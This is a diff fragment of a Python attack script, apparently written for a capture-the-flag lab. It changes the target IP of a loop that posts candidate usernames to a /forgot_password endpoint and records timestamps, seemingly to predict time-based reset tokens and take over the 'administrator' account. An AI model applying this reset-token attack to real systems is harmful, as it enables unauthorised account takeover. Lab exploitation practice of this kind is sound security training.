@@ -8,7 +8,7 @@ DIFF = datetime.timedelta(minutes=2)
 #Correct username is administrator
 for x in usernames:
 	data={'username':x}
-	requests.post('http://10.10.215.2/forgot_password',data=data) #Change ip address
+	requests.post('http://10.10.226.98/forgot_password',data=data) #Change ip address
 	value=datetime.datetime.now(datetime.timezone.utc) + DIFF
 	user1=x
 	for i in range(10):
